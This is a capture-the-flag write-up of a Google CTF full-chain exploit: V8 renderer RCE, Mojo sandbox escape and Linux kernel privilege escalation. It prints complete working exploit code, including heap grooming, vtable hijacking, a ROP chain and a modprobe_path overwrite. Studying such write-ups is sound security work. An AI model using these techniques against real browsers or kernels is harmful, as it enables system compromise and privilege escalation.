# google CTF Fullchain

[TOC]


The challenge gave us a vulnerable Chromium browser ( which contains vulnerabilities in two different parts: the V8 engine and the Mojo interface ) and a vulnerable linux kernel module. We were asked to pwn the entire thing: the V8 engine, the Chrome sandbox and the kernel module -- all with a single fullchain exploit.


## Renderer RCE ( V8 )

The challenge introduces a patch into V8 Javascript engine. It comments out three lines in function `TypedArrayPrototypeSetTypedArray`: 

```diff=
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..ac5ebe9913 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -198,7 +198,7 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
   if (targetOffsetOverflowed) goto IfOffsetOutOfBounds;
 
   // 9. Let targetLength be target.[[ArrayLength]].
-  const targetLength = target.length;
+  // const targetLength = target.length;
 
   // 19. Let srcLength be typedArray.[[ArrayLength]].
   const srcLength: uintptr = typedArray.length;
@@ -207,8 +207,8 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
 
   // 21. If srcLength + targetOffset > targetLength, throw a RangeError
   //   exception.
-  CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
-      otherwise IfOffsetOutOfBounds;
+  // CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
+  //     otherwise IfOffsetOutOfBounds;
 
   // 12. Let targetName be the String value of target.[[TypedArrayName]].
   // 13. Let targetType be the Element Type value in Table 62 for
```

This function will be called if we want to set a TypedArray within a TypedArray in Javascript. From the patch, it comments out a overflow check when `srcLength` plus `targetOffset` is larger than `targetLength` ( see the following Javascript for example ). If the patch was not introduced, it will throw an exception when we want to set a TypedArray larger than the src TypedArray. But because of this patch, we can bypass the overflow check and set the array with index 9 as the starting position. It's actually a very powerful out-of-bound write, and we use this vulnerability to overwrite `uint32`'s length to make us use this `uint32` to achieve out-of-bound read/write.

```javascript
const uint32 = new Uint32Array([0x1000]);
oob_access_array = [uint32];
var f64 = new Float64Array([1.1]);
uint32.set(uint32, 9);
console.log(uint32.length); // 0x1000
```

Because we allocate a Javascript `Array` after `TypedArray`, we can also modify its element as `Integer` from `uint32`. We use it to create a primitive function `addrof` by placing the object in `oob_access_array` and get its address from `uint32` at index 0x15. Another primitive function `fakeobj` is done by placing the arbitrary address at index 0x15 of `uint32` and get fake object from `oob_access_array`.

```javascript
function addrof(in_obj) {
    oob_access_array[0] = in_obj;
    return uint32[0x15];
}
function fakeobj(addr) {
    uint32[0x15] = addr;
    return oob_access_array[0];
}

```

We also leak `float_array_map` from `uint32` at index 62 and V8 heap base address from `uint32` at index 12. With `float_array_map` we can create a fake float array for arbitrary address read/write. With V8 heap base, we can read some useful content using arbitrary read/write on V8 heap.

```javascript
var float_array_map = uint32[62];
if (float_array_map == 0x3ff19999)
    float_array_map = uint32[63];

var arr2 = [itof(BigInt(float_array_map)), itof(0n), itof(8n), itof(1n), itof(0x1234n), 0, 0].slice();
var fake = fakeobj(addrof(arr2) - 0x38);
var v8_heap = BigInt(uint32[12]) << 32n;

function arbread(addr) {
    arr2[5] = itof(addr);
    return ftoi(fake[0]);
}

function arbwrite(addr, val) {
    arr2[5] = itof(addr);
    fake[0] = itof(val);
}
```

Now it is time to do some useful thing from those primitive functions. In renderer exploit, our goal is to modify a flag value so we can use Mojo in Javascript. Studying from the previous public write-ups about chrome exploit, the easiest way is to modify the the global variable `blink::RuntimeEnabledFeaturesBase::is_mojo_js_enabled_`. First we need to leak chrome base address. We use `window` object to leak it.

```javascript
var leak = BigInt(addrof(window)) + 0x10n + v8_heap - 1n;
var chrome_base = arbread(leak) - 0xc1ce730n;
```

But where is `is_mojo_js_enabled` ? Fortunately  the challenge chromium binary has symbol, we can use the following command to find out the offset of global variable `is_mojo_js_enabled_`.

```bash
$ nm --demangle ./chrome | grep -i 'is_mojo_js_enabled'
000000000c560f0e b blink::RuntimeEnabledFeaturesBase::is_mojo_js_enabled_
```

Turn on the flag and reload the page to make Mojo allowed in Javascript. We can store the `chrome_base` in localStorage, which can be used for exploiting the sandbox later. 

```javascript
var mojo_enabled = chrome_base + 0xc560f0en;
localStorage.setItem("chrome_base", chrome_base);
arbwrite(mojo_enabled, 1n);
window.location.reload();
```

The whole renderer exploit:

```javascript=
function pwn_v8() {
    print("In v8");
    const uint32 = new Uint32Array([0x1000]);
    oob_access_array = [uint32];
    var f64 = new Float64Array([1.1]);
    uint32.set(uint32, 9);

    var buf = new ArrayBuffer(8);
    var f64_buf = new Float64Array(buf);
    var u64_buf = new Uint32Array(buf);

    function ftoi(val) {
        f64_buf[0] = val;
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }

    function itof(val) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
        return f64_buf[0];
    }

    function addrof(in_obj) {
        oob_access_array[0] = in_obj;
        return uint32[0x15];
    }
    function fakeobj(addr) {
        uint32[0x15] = addr;
        return oob_access_array[0];
    }

    var float_array_map = uint32[62];
    if (float_array_map == 0x3ff19999)
        float_array_map = uint32[63];

    var arr2 = [itof(BigInt(float_array_map)), itof(0n), itof(8n), itof(1n), itof(0x1234n), 0, 0].slice();
    var fake = fakeobj(addrof(arr2) - 0x38);
    var v8_heap = BigInt(uint32[12]) << 32n;

    function arbread(addr) {
        arr2[5] = itof(addr);
        return ftoi(fake[0]);
    }

    function arbwrite(addr, val) {
        arr2[5] = itof(addr);
        fake[0] = itof(val);
    }
    var leak = BigInt(addrof(window)) + 0x10n + v8_heap - 1n;
    var chrome_base = arbread(leak) - 0xc1ce730n;
    var mojo_enabled = chrome_base + 0xc560f0en;
    localStorage.setItem("chrome_base", chrome_base);
    arbwrite(mojo_enabled, 1n);
    window.location.reload();
}
```

## Sandbox Escaping

For sandbox escaping, the challenge added a vulnerable Mojo interface `CtfInterface` to the Chromium browser. Here we only show the most important part of the challenge patch file:

```diff
+void CtfInterfaceImpl::Create(
+    mojo::PendingReceiver<blink::mojom::CtfInterface> receiver) {
+  auto self = std::make_unique<CtfInterfaceImpl>();
+  mojo::MakeSelfOwnedReceiver(std::move(self), std::move(receiver));
+}
+
+void CtfInterfaceImpl::ResizeVector(uint32_t size,
+                                    ResizeVectorCallback callback) {
+  numbers_.resize(size);
+  std::move(callback).Run();
+}
+
+void CtfInterfaceImpl::Read(uint32_t offset, ReadCallback callback) {
+  std::move(callback).Run(numbers_[offset]);
+}
+
+void CtfInterfaceImpl::Write(double value,
+                             uint32_t offset,
+                             WriteCallback callback) {
+  numbers_[offset] = value;
+  std::move(callback).Run();
+}
+

//.......omitted...........
// The CtfInterfaceImpl class
+class CONTENT_EXPORT CtfInterfaceImpl : public blink::mojom::CtfInterface {
+ public:
+  CtfInterfaceImpl();
+  ~CtfInterfaceImpl() override;
+  static void Create(
+      mojo::PendingReceiver<blink::mojom::CtfInterface> receiver);
+
+  void ResizeVector(uint32_t size, ResizeVectorCallback callback) override;
+  void Write(double value, uint32_t offset, WriteCallback callback) override;
+  void Read(uint32_t offset, ReadCallback callback) override;
+
+ private:
+  std::vector<double> numbers_;
+  DISALLOW_COPY_AND_ASSIGN(CtfInterfaceImpl);
+};

//.......omitted...........

+interface CtfInterface {
+  ResizeVector(uint32 size) => ();
+  Read(uint32 offset) => (double value);
+  Write(double value, uint32 offset) => ();
+};
```

As we can see in the patch file, the interface implements three functions to allow us interact with the browser process :

* `resizeVector` : This function allow us to allocate a double vector ( `std::vector<double> numbers_` ) in `CtfInterface`.
* `read` : This function allow us to read a double value from `numbers_`.
* `write` : This function will write a double value to `numbers_`.

The vulnerability is pretty obvious : the `read` and `write` function allow us to read/write a double value from/to a arbitrary offset of the `numbers_` vector, creating a OOB read/write situation.

Here our exploit plan is simple : use the OOB read to leak some address, and use the OOB write to corrupt the vtable of the `CtfInterfaceImpl` object and hijack the control flow.

First we'll have to arrange our heap layout. Our goal is to try place a `CtfInterfaceImpl` object right behind the `numbers_` vector, so later we can use OOB read/write on this `numbers_` to corrupt the `CtfInterfaceImpl` object.

After some trial and error, and lots of debugging with gdb, we were finally able to achieve this by using the following method:

* Create lots of `CtfInterfaceImpl` objects first. These objects will have high probability to be placed on a continuous heap memory.
* Free those `CtfInterfaceImpl` objects, this will create lots of free chunks ( size: 0x20 )
* Re-allocate those 0x20 free chunks by creating lots of `CtfInterfaceImpl` with a size 4 `numbers_` vector ( which will also allocate a 0x20 heap chunk ). The allocation sequence of `CtfInterfaceImpl` -> `size 4 numbers_` -> `CtfInterfaceImpl` -> `size 4 numbers_`... will probably results in a `CtfInterfaceImpl` object being placed right behind a size 4 `numbers_` vector. 

Here's the Javascript snippet:

```javascript
A = [];
B = [];
let i = 0;

// First allocate lots of CtfInterfaceImpl object
for (i = 0 ; i < 0x1000 ; i++) {
    A.push(null);
    A[i] = new blink.mojom.CtfInterfacePtr();
    Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(A[i]).handle);
}

// Free all the CtfInterfaceImpl, creating lots of free chunk ( size: 0x20 )
for (i = 0 ; i < 0x1000 ; i++) {
    A[i].ptr.reset();
}

// Re-allocate those 0x20 free chunks with the following allocation sequence: 
// CtfInterfaceImpl -> size 4 double vector -> CtfInterfaceImpl -> size 4 double vector...
for (i = 0 ; i < 0x1000 ; i++) {
    B.push(null);
    B[i] = new blink.mojom.CtfInterfacePtr();
    Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(B[i]).handle);
    B[i].resizeVector(0x4); // double vector with size 4 == allocate a 0x20 chunk
}

// Write value to B[i] for debug usage
for (i = 0 ; i < 0x1000 ; i++) {
    await B[i].write(itof(BigInt(i)), 0);
}
```

By doing this, we found that there's a high probability that `CtfInterfaceImpl` object `B[2]` will be placed right behind `B[0]`'s `numbers_` vector. By using the OOB read/write on `B[0]->numbers_`, we'll be able to leak some address and hijack the control flow.

However there's still a possibility that `B[2]` won't be placed right behind `B[0]->numbers_`, so before we continue our exploitation, we'll have to make sure that the current heap layout is exploitable:

```javascript
// leak address from B[2]
var vtable = (await B[0].read(4)).value; // vtable
var heap1 = (await B[0].read(5)).value; // numbers_ ( vector_begin )
var heap2 = (await B[0].read(6)).value; // numbers_ ( vector_end )

vtable = ftoi(vtable);
heap1 = ftoi(heap1);
heap2 = ftoi(heap2);
/* Check if B[2] is right behind B[0]->numbers_ */
if ((heap1 + 0x20n == heap2) && ( (vtable & 0xfffn) == 0x4e0n)) { // Pass check !
    print("OK!");
    print(hex(vtable));
    print(hex(heap1));
    print(hex(heap2));
} else { // Failed ! reload page and restart SBX exploit
    window.location.reload();
}
```

Here we use the values we leaked from `B[0]->numbers_` and see if they contain the vtable address of `CtfInterfaceImpl` and the heap address of `B[2]->numbers_`. If it passes the check, continue our exploit, or else we'll have to reload the page and restart our SBX exploit.

By now we're able to corrupt the `B[2]` object and do some interesting stuff. For example, we can achieve arbitrary read/write by corrupting the pointer of `B[2]->numbers_`:

```javascript
// Now B[0] can control B[2]->numbers_'s data pointer by setting B[0].Write(xxx, 5)
async function aaw(address, value) {
    // arbitrary write
    await B[0].write(itof(address), 5);
    await B[2].write(itof(value), 0);
}

async function aar(address) {
    // arbitrary read
    await B[0].write(itof(address), 5);
    var v = (await B[2].read(0)).value;
    return ftoi(v);
}
```

However, it seems that we don't need those arbitrary read/write primitive after all. Since now we have the base address of `chromium` ( the vtable address ) and the heap buffer address ( `B[2]->numbers_` ), we ended up using the following exploit plan to achieve RCE:

* We placed all of our payload ( fake vtable entry, ROP chain and shellcode ) in the heap buffer of `B[2]->numbers_` ( the content of `B[2]->numbers_` is totally controllable, plus there's no size limit ).
* We then modify the vtable of `B[2]` to point to our crafted heap buffer.
* By calling `B[2].ptr.reset()`, it will trigger the destructor of `B[2]` and jump to our fake vtable entry, which points to our stack pivoting ROP gadget: `xchg rax, rsp; add cl, byte ptr [rax - 0x77]; ret;`.
* After stack pivoting, the stack will be migrated to our crafted heap buffer and start doing ROP. Our ROP chain will do `sys_mprotect( heap & ~0xfff, 0x2000, 7 )`, making our crafted heap buffer executable.
* Finally, the ROP chain will jump to our shellcode ( which is also placed on our crafted heap buffer ) and execute our kernel exploit.

Here's our final exploit script for the sandbox challenge ( in a form of a single Javascript file ):

```javascript=
arb = new ArrayBuffer(8);
f64 = new Float64Array(arb);
B64 = new BigInt64Array(arb);

function ftoi(f) {
    f64[0] = f;
    return B64[0];
}

function itof(i) {
    B64[0] = i;
    return f64[0];
}

function pwn_sbx() {
    print('In sbx!');
    (async function pwn() {
        A = [];
        B = [];
        let i = 0;
        
        // First allocate lots of CtfInterfaceImpl object
        for (i = 0 ; i < 0x1000 ; i++) {
            A.push(null);
            A[i] = new blink.mojom.CtfInterfacePtr();
            Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(A[i]).handle);
        }

        // Free all the CtfInterfaceImpl, creating lots of free chunk ( size: 0x20 )
        for (i = 0 ; i < 0x1000 ; i++) {
            A[i].ptr.reset();
        }

        // Re-allocate those 0x20 free chunks with the following allocation sequence: 
        // CtfInterfaceImpl -> size 4 double vector -> CtfInterfaceImpl -> size 4 double vector...
        for (i = 0 ; i < 0x1000 ; i++) {
            B.push(null);
            B[i] = new blink.mojom.CtfInterfacePtr();
            Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(B[i]).handle);
            B[i].resizeVector(0x4); // double vector with size 4 == allocate a 0x20 chunk
        }

        // Write value to B[i] for debug usage
        for (i = 0 ; i < 0x1000 ; i++) {
            await B[i].write(itof(BigInt(i)), 0);
        }

        // leak address from B[2]
        var vtable = (await B[0].read(4)).value; // vtable
        var heap1 = (await B[0].read(5)).value; // numbers_ ( vector_begin )
        var heap2 = (await B[0].read(6)).value; // numbers_ ( vector_end )

        vtable = ftoi(vtable);
        heap1 = ftoi(heap1);
        heap2 = ftoi(heap2);
        /* Check if B[2] is right behind B[0]->numbers_ */
        if ((heap1 + 0x20n == heap2) && ( (vtable & 0xfffn) == 0x4e0n)) { // pass check !
            print("OK!");
            print(hex(vtable));
            print(hex(heap1));
            print(hex(heap2));
        } else { // failed ! reload page and restart SBX exploit
            window.location.reload();
        }

        // Now B[0] can control B[2]'s data pointer by setting B[0].Write(xxx, 5)
        async function aaw(address, value) {
            await B[0].write(itof(address), 5);
            await B[2].write(itof(value), 0);
        }

        async function aar(address) {
            await B[0].write(itof(address), 5);
            var v = (await B[2].read(0)).value;
            return ftoi(v);
        }

        var chrome_base = vtable - 0xbc774e0n; // get chrome base address
        var chrome_base_rop = chrome_base + 0x33c9000n; // We found ROP gadgets in a weird way, so we need another base address for our ROP gadgets
        xchg_rax_rsp = chrome_base_rop + 0x8f0e18n; // xchg rax, rsp; add cl, byte ptr [rax - 0x77]; ret;
        pop1 = chrome_base_rop + 0x29ddebn; // pop r12; ret
        pop_rax = chrome_base_rop + 0x50404n; // pop rax; ret;
        pop_rsi = chrome_base_rop + 0xc5daen; // pop rsi; ret;
        pop_rdx = chrome_base_rop + 0x28c332n; // pop rdx; ret; 
        pop_rdi = chrome_base_rop + 0x20b45dn; // pop rdi; ret; 
        syscall_ret = chrome_base + 0x800dd77n; // syscall; ret;
        jmp_rax = chrome_base_rop + 0xbcfn; // jmp rax;
        
        /* Our ROP chain */
        await B[2].write(itof(pop1), 0); // ROP will start from here
        await B[2].write(itof(xchg_rax_rsp), 1); // vtable will jump to here
        await B[2].write(itof(pop_rax), 2); // pop rax
        await B[2].write(itof(10n), 3); // rax = 10 ( mprotect's syscall number )
        await B[2].write(itof(pop_rdx), 4); // pop rdx
        await B[2].write(itof(7n), 5); // rdx = 7 ( PROT = rwx )
        await B[2].write(itof(pop_rsi), 6); // pop rsi
        await B[2].write(itof(0x2000n), 7); // rsi = 0x2000
        await B[2].write(itof(pop_rdi), 8); // pop rdi
        await B[2].write(itof((heap1 & (~0xfffn))), 9); // rdi = heap1 & (~0xfff)
        await B[2].write(itof(syscall_ret), 10); // do syscall ( mprotect(heap1 & ~0xfff, 0x2000, 7) )
        await B[2].write(itof(pop_rax), 11); // pop rax
        await B[2].write(itof(heap1+0x100n), 12); // rax = heap1 + 0x100
        await B[2].write(itof(jmp_rax), 13); // jmp to RAX ( B[2]->numbers_[32], our shellcode )

        /* Our shellcode */
        await B[2].write(itof(0xfeebn), 32); // infinite loop
        //await B[2].write(itof(shellcode in BigInt), 33); 
        //await B[2].write(itof(shellcode in BigInt), 34); 
        //.............. 

        /* Change B[2]'s vtable and trigger destructor, jump to our ROP chain*/
        await B[0].write(itof(heap1), 4); // change B[2]'s vtable
        await B[2].ptr.reset(); // call [rax+8] == xchg rax, rsp...

        print("Done"); // Should never reach here
    })();
}
```

## Local Privilege Escalation ( kernel )

In this part of challenge, it installs a kernel module which will expose a device at `/dev/ctf`. It implements several functions: `ctf_read`, `ctf_write`, `ctf_ioctl` and `ctf_open`. We can use `ctf_ioctl` to allocate a kernel heap buffer for `ctf_read` and `ctf_write`'s usage. `ctf_ioctl` also allow us to free a kernel heap buffer. 

There are two vulnerabilities we used for achieve local privilege escalation. Both are in `ctf_ioctl`. An uninitialized heap is used for allocating the buffer. Because it didn't zero out the buffer, we can use it for address leaking. Another vulnerability is use-after-free. When we free a kernel heap buffer, it didn't set its pointer to NULL, making it still accessible with `ctf_read` and `ctf_write`.

```C
struct ctf_data {
  char *mem;
  size_t size;
};

static ssize_t ctf_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
  struct ctf_data *data = f->private_data;
  char *mem;

  switch(cmd) {
  case 1337:
    if (arg > 2000) {
      return -EINVAL;
    }

    mem = kmalloc(arg, GFP_KERNEL);
    if (mem == NULL) {
      return -ENOMEM;
    }

    data->mem = mem;
    data->size = arg;
    break;

  case 1338:
    kfree(data->mem);
    break;

  default:
    return -ENOTTY;
  }

  return 0;
}
```

First we need to leak kernel text base address. We spray a lot of `struct tty_struct` to make kernel heap contain lots of `tty_operations` data, which includes lots of kernel address.

```C
for(int i=0;i<0x100;i++)
    fd[i] = open(ptmx,2);
for(int i=0;i<0x100;i++)
    close(fd[i]);
```

Then we can use `ctf_ioctl` to allocate the heap buffer with the same size as `struct tty_struct`, letting us able to get those kernel address with `ctf_read`.

```cpp
int ctf = open("/dev/ctf",2);
ioctl(ctf,1337,0x2c0); // allocate heap size same as tty_struct
char buf[0x100];
read(ctf,buf,0x100); // leak kernel base address
size_t* p = (size_t*)buf;
size_t kaddr = p[3] - 0x20745e0;
```

With the kernel address, our next step is to achieve kernel address arbitrary write. We can use the internal data structure `struct ctf_data` to achieve this. We first allocate a buffer which size is same as `struct ctf_data` and free it. Then, we spray a lot of `struct ctf_data` to make it allocate the buffer we just freed. We then can modify `struct ctf_data` from another file descriptor with `ctf_write`.

```cpp
ioctl(ctf,1338,0x0);
// Allocate buffer size same as ctf_data, then free it. 
// We later use ctf_write on this buffer to modify struct ctf_data
ioctl(ctf,1337,0x10);
ioctl(ctf,1338,0x0);
// spray lots of struct ctf_data
// one of them will use the heap buffer we just freed
for(int i=0;i<0x100;i++){
    fd[i] = open(ctfpath, 2); // open /dev/ctf
}
// for scanning usage
for(int i=0;i<0x100;i++){
    ioctl(fd[i],1337,0x100*(i+1));
}
```

Once we can fully control a `struct ctf_data`, we can just modify `mem` and `size` to achieve kernel address arbitrary write. We choose to modify `modprobe_path` to achieve local privilege escalation.

```cpp
// Get the fd of our victim ctf_data
read(ctf,buf,0x10);
int idx = p[1]/0x100-1;
// Modify the ctf_data structure
// mem pointer will become modprobe_path
size_t payload[] = {kaddr+0x244DD40,0x100};
write(ctf,payload,0x10);
// Overwrite modprobe_path
char path[] = "/tmp/x";
write(fd[idx],path,sizeof(path));
```

We plan to execute our entire kernel exploit in pure shellcode format. Here we create a Makefile which can create a 0x1000 bytes shellcode from a C source. The shellcode will be created at the first 0x1000 bytes of `sc.bin`. 


```Makefile=
all: sc.bin

sc.bin: sc.o
	ld --oformat=binary sc.o -o sc.bin -Ttext 0 -Tbss 0xc00  -Tdata 0x800
sc.o:	sc.c
	gcc -fomit-frame-pointer -fno-stack-protector -nostdlib -fPIE -masm=intel -c sc.c

clean:
	rm sc.bin sc.o
```

The exploit in C :
```c=
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/syscall.h>

int fd[0x100];
char ctfpath[] = "/dev/ctf";
char ptmx[] = "/dev/ptmx";
char msg[] = "#!/bin/bash\ncat /dev/vdb>/tmp/root";
char mess[] = "\xff\xff\xff\xff";
char ybin[] = "/tmp/y";
char flagpath[] = "/tmp/root";
int memfd_create(char* ptr,unsigned int flags);
int my_itoa(int val,char* buf);

void _start(){

	for(int i=0;i<0x100;i++)
		fd[i] = open(ptmx,2);
	for(int i=0;i<0x100;i++)
		close(fd[i]);
	
	int ctf = open(ctfpath,2);
	ioctl(ctf,1337,0x2c0);
	char buf[0x100];
	read(ctf,buf,0x100);
	size_t* p = (size_t*)buf;
	size_t kaddr = p[3] - 0x20745e0;

	ioctl(ctf,1338,0x0);
	ioctl(ctf,1337,0x10);
	ioctl(ctf,1338,0x0);
	for(int i=0;i<0x100;i++){
		fd[i] = open(ctfpath,2);
	}
	for(int i=0;i<0x100;i++){
		ioctl(fd[i],1337,0x100*(i+1));
	}
	read(ctf,buf,0x10);
	int idx = p[1]/0x100-1;
	size_t payload[] = {kaddr+0x244DD40,0x100};
	write(ctf,payload,0x10);
	char path[] = "/tmp/x";
	write(fd[idx],path,sizeof(path));
	int mod = open(path,O_CREAT|O_WRONLY,0777);
	write(mod,msg,sizeof(msg));
	close(mod);

	int y = open(ybin,O_CREAT|O_WRONLY,0777);
	write(y,mess,sizeof(mess));
	close(y);
	execve(ybin,NULL,NULL);
	int flag = open(flagpath,0);
	read(flag,buf,0x100);
	write(1,buf,0x100);
	my_exit(0);
}

void my_exit(int status){
	 asm volatile ("syscall" :: "a"(SYS_exit));
}

int execve(const char *pathname, char *const argv[],
                  char *const envp[]){
	asm volatile ("syscall" :: "a"(SYS_execve));
}
int close(int fd){
	asm volatile ("syscall" :: "a"(SYS_close));
}

int ioctl(int fd, unsigned long request, ...){
	asm volatile ("syscall" :: "a"(SYS_ioctl));
}

int open (const char *__file, int __oflag, ...){
	asm volatile ("syscall" :: "a"(SYS_open));
}

ssize_t write (int __fd, const void *__buf, size_t __n){
	asm volatile ("syscall" :: "a"(SYS_write));
}

ssize_t read (int __fd, void *__buf, size_t __nbytes){
	asm volatile ("syscall" :: "a"(SYS_read));
}

int dup2(int oldfd, int newfd){
	asm volatile ("syscall" :: "a"(SYS_dup2));
}

```

In order to combine our kernel exploit with the one in sandbox escape, we wrote a simple python script and convert `sc.bin` into Javascript format. The whole exploit.html is kind of large, you can check the entire exploit [here](https://github.com/st424204/ctf_practice/tree/master/GoogleCTF2021/Fullchain).

flag: `CTF{next_stop_p2o_fda81a139a70c6d4}`
